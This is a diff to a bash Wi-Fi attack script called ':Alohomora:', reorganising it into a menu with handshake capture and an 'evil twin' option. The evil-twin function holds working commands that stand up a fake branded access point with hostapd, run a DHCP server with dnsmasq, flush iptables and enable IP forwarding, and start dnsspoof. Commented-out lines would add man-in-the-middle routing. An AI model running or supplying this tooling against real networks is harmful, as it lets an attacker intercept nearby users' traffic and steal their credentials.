@@ -1,7 +1,13 @@
 #!/bin/bash
 toilet -t -f mono12 --filter border:metal ":Alohomora:"
-printf "                              || this script belongs to the half blood prince ||\n"
+printf "                              || this script belongs to the half blood prince ||\n\n\n"
 
+
+#-------------------------------------------------------------------------------------------------------------
+# function for deciding the type of FAKE AP   ------------------------------------------------------------------
+#-------------------------------------------------------------------------------------------------------------
+function evil_twin_attack()
+{
 printf "\n[-] select the brand of FAKE AP:\n"
 printf "\n[1] DIGISOL\n[2] TPLINK\n[3] D-LINK\n\n[-] Enter the number corresponding to the AP\n[->] "
 read APName
@@ -39,26 +45,83 @@ then
 fi
 done
 
-## deciding the type of attack
-#attack_flag=0
-#printf "\n[-] select the type of attack\n"
-#printf "\n[1] MITM\n[2] Captive Portal\n[->] "
-#read attack_flag
-#while true
-#do
-#    if [[ $attack_flag == 1 ]]
-#    then
-#	    printf "\n[-] starting MITM attack. . . \n"
-#	    break
-#    elif [[ $attack_flag == 2 ]]
-#    then
-#	    printf "\n[-] starting Captive Portal attack. . .\n" 
-#	    break
-#    else
-#	    printf "\n[!] Invalid option, enter your option again.\n[->] "
-#	    read attack_flag
-#    fi
-#done
+# running hostapd
+printf "[-] creating fake AP. . .\n"
+#xterm -geometry 93x31+100+35  -hold -e "hostapd hostapd.conf" &
+xterm -geometry 93x31+100+35  -hold -e "hostapd conf_files/hostapd.conf" &
+#hostapd hostapd.conf &
+sleep 17
+# assigning ip on the wlan interface
+printf "[-] assigning ip on $interface. . . \n"
+ifconfig wlan0mon up 192.168.1.1 netmask 255.255.255.0
+
+# adding the route for the network configured for dhcp
+printf "[-] adding route. . .\n"
+route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+
+# configuring DHCP
+printf "[-] starting DHCP server. . .\n"
+#xterm -geometry 93x31+100+550  -hold -e "dnsmasq -C dnsmasq.conf -d" &
+xterm -geometry 93x31+100+550  -hold -e "dnsmasq -C conf_files/dnsmasq.conf -d" &
+#dnsmasq -C dnsmasq.conf -d &
+sleep 7
+
+# configuring the ip tables
+printf "[-] configuring iptables. . .\n"
+iptables --flush
+iptables --table nat --flush
+iptables --delete-chain
+iptables --table nat --delete-chain
+iptables -P FORWARD ACCEPT
+
+#uncomment for mitm
+#iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+#iptables --append FORWARD --in-interface wlan0mon -j ACCEPT
+
+printf "[-] enabling ip forwarding. . .\n"
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+
+printf "[-] spoofing dns. . .\n"
+dnsspoof -i wlan0mon 
+#printf "[-] starting apache2 server. . .\n"
+}
+
+
+#-------------------------------------------------------------------------------------------------------------
+# function for deciding the type of attack
+#-------------------------------------------------------------------------------------------------------------
+function select_attack()
+{
+attack_flag=0
+printf "\n[-] select the attack to be performed\n"
+printf "\n[1] Capture Handshake\n[2] Evil Twin\n[3] EXIT (for exiting this session)\n[->] "
+read attack_flag
+while true
+do
+    if [[ $attack_flag == 1 ]]
+    then
+	    printf "\n[-] initiating attack for captureing handshake. . . \n"
+	    ./python_scripts/p_sniffer.py
+	    select_attack
+    elif [[ $attack_flag == 2 ]]
+    then
+	    printf "\n[-] starting EVIL TWIN  attack. . .\n" 
+	    evil_twin_attack
+	    break
+    elif [[ $attack_flag == 3 ]]
+    then
+	    exit
+    else
+	    printf "\n[!] Invalid option, enter your option again.\n[->] "
+	    read attack_flag
+    fi
+done
+}
+
+#-----------------------------------------------------------------------------------------------------------------
+# configureing the wi-fi interface:     -----------------------------------------------------------
+#-----------------------------------------------------------------------------------------------------------------
 
 # selecting the interface for cmd arg if provided
 if [[ $# -gt 0 ]]
@@ -125,43 +188,7 @@ then
     exit
 fi
 
-# running hostapd
-printf "[-] creating fake AP. . .\n"
-#xterm -geometry 93x31+100+35  -hold -e "hostapd hostapd.conf" &
-xterm -geometry 93x31+100+35  -hold -e "hostapd conf_files/hostapd.conf" &
-#hostapd hostapd.conf &
-sleep 17
-# assigning ip on the wlan interface
-printf "[-] assigning ip on $interface. . . \n"
-ifconfig wlan0mon up 192.168.1.1 netmask 255.255.255.0
-
-# adding the route for the network configured for dhcp
-printf "[-] adding route. . .\n"
-route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
-
-# configuring DHCP
-printf "[-] starting DHCP server. . .\n"
-#xterm -geometry 93x31+100+550  -hold -e "dnsmasq -C dnsmasq.conf -d" &
-xterm -geometry 93x31+100+550  -hold -e "dnsmasq -C conf_files/dnsmasq.conf -d" &
-#dnsmasq -C dnsmasq.conf -d &
-sleep 7
-
-# configuring the ip tables
-printf "[-] configuring iptables. . .\n"
-iptables --flush
-iptables --table nat --flush
-iptables --delete-chain
-iptables --table nat --delete-chain
-iptables -P FORWARD ACCEPT
-
-#uncomment for mitm
-#iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
-#iptables --append FORWARD --in-interface wlan0mon -j ACCEPT
-
-printf "[-] enabling ip forwarding. . .\n"
-echo 1 > /proc/sys/net/ipv4/ip_forward
-
-
-printf "[-] spoofing dns. . .\n"
-dnsspoof -i wlan0mon 
-#printf "[-] starting apache2 server. . .\n"
+#-----------------------------------------------------------------------------------------------------------------
+# MAIN:                                      -----------------------------------------------------------
+#-----------------------------------------------------------------------------------------------------------------
+select_attack
